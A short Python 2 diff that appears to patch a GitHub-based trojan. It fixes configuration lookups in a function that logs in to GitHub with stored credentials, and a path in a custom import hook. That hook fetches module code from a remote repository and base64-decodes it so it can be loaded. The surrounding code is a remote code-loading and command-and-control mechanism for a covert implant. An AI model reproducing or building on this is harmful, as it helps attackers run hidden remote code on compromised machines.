@@ -20,8 +20,8 @@ configured = False
 task_queue = Queue.Queue()
 
 def connect_to_github():
-    gh = login(username=cfgdata["username"],password=cfgdata["password"])
-    repo = gh.repository(cfgdata["username"],cfgdata["repo"])
+    gh = login(username=cfg.cfgdata["username"],password=cfg.cfgdata["password"])
+    repo = gh.repository(cfg.cfgdata["username"],cfg.cfgdata["repo"])
     branch = repo.branch("master")
 
     return gh,repo,branch
@@ -62,7 +62,7 @@ class GitImporter(object):
     def find_module(self,fullname,path=None):
         if configured:
             print "[*] Attempting to retrieve %s" % fullname
-            new_library = get_file_contents("/modules/%s" % fullname)
+            new_library = get_file_contents("modules/%s" % fullname)
 
             if new_library is not None:
                 self.current_module_code = base64.b64decode(new_library)
